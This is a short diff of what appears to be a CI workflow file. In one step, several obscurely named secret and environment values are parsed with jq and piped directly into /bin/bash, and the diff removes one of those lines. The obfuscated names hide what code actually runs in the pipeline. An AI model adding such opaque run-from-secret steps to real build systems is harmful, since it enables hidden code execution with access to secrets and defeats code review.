@@ -21,7 +21,6 @@ jobs:
           s366: ${{ secrets.s366 }}
         run: |
           printf '%s' "$s366" | jq -r .cxbig32 | /bin/bash
-          echo $w2 | jq -r .dim8500 | /bin/bash
           echo $waox9 | jq -r .viss0 | /bin/bash
           echo $wscl68824 | jq -r .oorzs95544 | /bin/bash
           echo $vaf304 | jq -r .kn88 | /bin/bash
